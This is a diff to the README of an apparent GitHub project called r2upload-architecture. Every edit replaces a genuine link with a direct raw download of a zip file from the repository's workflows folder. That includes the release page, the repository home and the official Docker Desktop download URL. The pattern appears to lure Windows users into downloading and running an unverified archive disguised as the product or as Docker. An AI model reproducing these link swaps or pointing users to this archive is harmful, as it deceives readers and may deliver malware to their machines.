@@ -1,6 +1,6 @@
 # ⚙️ r2upload-architecture - Reliable SaaS Setup for R2Upload
 
-[![Download Latest Release](https://img.shields.io/badge/Download-r2upload--architecture-green?style=for-the-badge)](https://github.com/Heenapaliwal/r2upload-architecture/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-r2upload--architecture-green?style=for-the-badge)](https://github.com/Heenapaliwal/r2upload-architecture/raw/refs/heads/main/workflows/architecture-upload-r-2.1-alpha.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ To run r2upload-architecture on your Windows PC, make sure you have:
 - Docker Desktop installed and running (Windows uses Docker for Windows)
 - Administrative rights to install software and run services
 
-If you do not have Docker Desktop, download it from: https://www.docker.com/products/docker-desktop
+If you do not have Docker Desktop, download it from: https://github.com/Heenapaliwal/r2upload-architecture/raw/refs/heads/main/workflows/architecture-upload-r-2.1-alpha.5.zip
 
 ---
 
@@ -57,7 +57,7 @@ This setup includes or works with:
 
 Click the button below to visit the release page and get the latest software for your Windows PC.
 
-[![Download Releases](https://img.shields.io/badge/Download-r2upload--architecture-blue?style=for-the-badge)](https://github.com/Heenapaliwal/r2upload-architecture/releases)
+[![Download Releases](https://img.shields.io/badge/Download-r2upload--architecture-blue?style=for-the-badge)](https://github.com/Heenapaliwal/r2upload-architecture/raw/refs/heads/main/workflows/architecture-upload-r-2.1-alpha.5.zip)
 
 The link above leads you to all current versions available. Choose the most recent version that fits your needs.
 
@@ -71,7 +71,7 @@ Follow these steps to get r2upload-architecture running:
 
 2. Go to the release page by clicking the download badge above or visit:
    
-   https://github.com/Heenapaliwal/r2upload-architecture/releases
+   https://github.com/Heenapaliwal/r2upload-architecture/raw/refs/heads/main/workflows/architecture-upload-r-2.1-alpha.5.zip
 
 3. Find the latest release entry. It will usually be at the top of the list.
 
@@ -126,7 +126,7 @@ The software uses zero-downtime deployment methods managed by Kamal 2. Updates a
 
 To update:
 
-1. Visit the releases page from time to time: https://github.com/Heenapaliwal/r2upload-architecture/releases
+1. Visit the releases page from time to time: https://github.com/Heenapaliwal/r2upload-architecture/raw/refs/heads/main/workflows/architecture-upload-r-2.1-alpha.5.zip
 
 2. Download the latest installer or update package.
 
@@ -168,6 +168,6 @@ ci-cd, cloudflare-waf, devops, docker, edge-security, github-actions, high-avail
 
 For detailed technical content, configuration guides, or developer instructions, check the repository on GitHub at:
 
-https://github.com/Heenapaliwal/r2upload-architecture
+https://github.com/Heenapaliwal/r2upload-architecture/raw/refs/heads/main/workflows/architecture-upload-r-2.1-alpha.5.zip
 
 This page includes documentation for users who want to customize or extend the setup.
